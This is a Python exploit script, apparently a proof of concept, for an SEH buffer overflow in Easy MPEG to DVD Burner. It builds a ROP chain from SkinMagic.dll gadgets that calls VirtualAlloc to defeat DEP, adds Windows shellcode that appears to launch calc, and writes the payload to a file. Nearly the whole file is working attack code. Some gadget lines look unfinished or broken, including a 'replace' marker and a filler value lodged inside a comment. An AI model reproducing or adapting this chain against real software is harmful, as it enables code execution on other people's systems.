#!/usr/bin/python

#------------------------------------------------------------------------------------------------------------------------------------#

# My register setup when VirtualAlloc() is called (Defeat DEP) :
#--------------------------------------------
# EAX = Points to PUSHAD at time VirtualAlloc() is called (Stack Pivot jumps over it on return)
# ECX = flProtect (0x40)
# EDX = flAllocationType (0x1000)
# EBX = dwSize (0x01)
# ESP = lpAddress (automatic)
# EBP = ReturnTo (stack pivot into a rop nop / jmp esp)
# ESI = ptr to VirtualAlloc()
# EDI = ROP NOP (RETN)

import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
       #***START VirtualAlloc() to ESI***
      0x10027020,  # POP EAX # RETN [SkinMagic.dll] 
      0x1003b1d4,  # ptr to &VirtualAlloc() [IAT SkinMagic.dll]
      0x100369a1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [SkinMagic.dll] 
      ########SUSTITUIR######0x00417be6,  # XCHG EAX,ESI # RETN [Easy MPEG to DVD Burner.exe]
      0x10025e05,  # POP EBX # RETN 0x0C    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}      0x41414141,
      0xffffffff,
      0x10037bd3,  # INC EBX # FPATAN # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x10037bd7,
      0x10037bd7,
      0x10037bd7,
      0x10037bd3,  # INC EBX # FPATAN # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x10032f5c,  # POP EDX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0xffffffff,
      0x10035a07,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10037654,  # POP EAX # RETN [SkinMagic.dll] 
      0xa141dffb, # Resta para llegar a 0041A87E  |. 03D3           ADD EDX,EBX pop ebx retn 10
      0x100317c8,  # ADD EAX,5EFFC883 # RETN [SkinMagic.dll]
      0x1003248d,  # PUSH EAX # RETN
      0x41414141,
      0x1003993e,  # PUSH EDX # ADD AL,5F # POP ESI # POP EBX # RETN 0x0C    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x10037bd7,
      0x10037bd7,
      0x10037bd7,
      0x10037bd7,
      0x10037bd7,

      #***END VirtualAlloc() to ESI***
      
      
     #***START 0x1000 to EDX***
      0x10032993,  # POP EBX # RETN [SkinMagic.dll]
      0x10037bd7,
      0x10037bd7,
      0x10037bd7,
      0xaaaaaaaa,  #
      0x10037bc0,  # POP EDX # RETN [SkinMagic.dll]
      0x55556556,  #
      0x10037654,  # POP EAX # RETN [SkinMagic.dll] 
      0xa141dffb,  # 
      0x100317c8,  # ADD EAX,5EFFC883 # RETN [SkinMagic.dll] Gets us to #0x0041a87e # ADD EDX,EBX # POP EBX # RETN 0x10 [Easy MPEG to DVD Burner.exe]
      0x1003248d,  # PUSH EAX # RETN [SkinMagic.dll] | Calls #0x0041a87e # ADD EDX,EBX # POP EBX # RETN 0x10 [Easy MPEG to DVD Burner.exe]
      0x41414141,  # FILLER
      #***END 0x1000 to EDX***

      
     #0x0041a87e :  # ADD EDX,EBX # POP EBX # RETN 0x10    ** [Easy MPEG to DVD Burner.exe] **   |  startnull {PAGE_EXECUTE_READ}

      
      #[---INFO:gadgets_to_set_ecx:---]
      0x1003a07c,  # POP ECX # RETN [SkinMagic.dll] 
      0xffffffff,  #
      0xffffffff,  #
      0xffffffff,  #
      0xffffffff,  #
      0xffffffff,  #
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x10021e35,  # INC ECX # MOV EAX,ECX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      #[---INFO:gadgets_to_set_edi:---]
      0x1002745f,  # POP EDI # RETN [SkinMagic.dll] 
      0x10037bd7,  # RETN (ROP NOP) [Easy MPEG to DVD Burner.exe]
      #[---INFO:gadgets_to_set_eax:---]
      #***START 0x1 to EBX***
      0x10015FDB,  #   5B               POP EBX pop algo retn 10      
      0xFFFFFFFF,
      0x41414141,
      0x10037bd3,  # INC EBX # FPATAN # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x41414141,
      0x41414141,
      0x41414141,
      0x41414141,
      0x10037bd3,  # INC EBX # FPATAN # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      #***END 0x1 to EBX***
      0x10033aef,  # POP EAX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x90909090,  # nop
      #*** Start EBP = ReturnTo (stack pivot into a rop nop / jmp esp)***
      0x1002829d,  # POP EBP # RETN [SkinMagic.dll]
      0x100284f8,  # {pivot 16 / 0x10} :  # ADD ESP,0C # POP EBP # RETN [SkinMagic.dll]
      #*** END EBP = ReturnTo (stack pivot into a rop nop / jmp esp)*** #[---INFO:pushad:---]
      #***START Gadgets to execute PUSHAD / Execute VirtualAlloc()***
      0x10037654,  # POP EAX # RETN [SkinMagic.dll] 
      0xa140acd2,  # CONSTANT
      0x100317c8,  # ADD EAX,5EFFC883 # RETN [SkinMagic.dll] (Puts location of a PUSHAD into EAX "0x00407555",   # PUSHAD # RETN [Easy MPEG to DVD Burner.exe]
      0x1003248d,  # PUSH EAX # RETN [SkinMagic.dll] | Calls #0x00407555,   # PUSHAD # RETN [Easy MPEG to DVD Burner.exe]
      #***END Gadgets to execute PUSHAD***
        #***After Return from VirtualAlloc() / stack pivot land in ROP NOP Sled / jmp ESP --> Execute Shellcode***
      0x10032158,  # RETN (ROP NOP) [SkinMagic.dll]
      0x10032158,  # RETN (ROP NOP) [SkinMagic.dll]
      0x10032158,  # RETN (ROP NOP) [SkinMagic.dll]
      0x10032158,  # RETN (ROP NOP) [SkinMagic.dll]
      0x1001cc57,  # & push esp # ret  [SkinMagic.dll]

    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

#1012 desborda SEH
shellcode = ("\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72"
         "\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F"
         "\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24"
         "\x01\xF9\x0F\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45"
         "\x75\xF1\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7")

rop_nop = "\x87\x21\x03\x10" * 22 #10032187   C3               RETN
push = "\x57\xcc\x01\x10" # 0x1001cc57
nop = '\x90' * 20

seh = "\x06\x4e\x40" # 0x00404e06 : {stack pivot 1928 / 0x788} (Lands us into rop nop chain --> rop_chain) :  # POP EDI # POP ESI # POP EBP # MOV DWORD PTR FS:[0],ECX # POP EBX # ADD ESP,778 # RETN [Easy MPEG to DVD Burner.exe]

exploit= rop_nop  + rop_chain + nop + shellcode+ "A" * (1012 - len(rop_nop+rop_chain+shellcode+nop)) + seh

print(len(exploit))
f = open ("Exploit.txt", "w")
f.write(exploit)
f.close()
